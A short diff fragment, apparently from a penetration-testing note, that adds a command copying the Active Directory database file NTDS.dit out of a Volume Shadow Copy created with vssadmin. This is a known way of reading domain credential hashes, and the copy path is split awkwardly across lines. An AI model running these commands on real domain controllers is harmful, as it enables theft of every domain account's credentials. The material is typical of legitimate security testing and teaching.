@@ -38,5 +38,7 @@ vssadmin CREATE SHADOW /For=C:
 ```
 Copy to another location: 
 ```powershell 
-cmd.exe
+	cmd.exe  /c copy \\? 
+	\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit 
+	c:\NTDS\NTDS.dit 
 ```
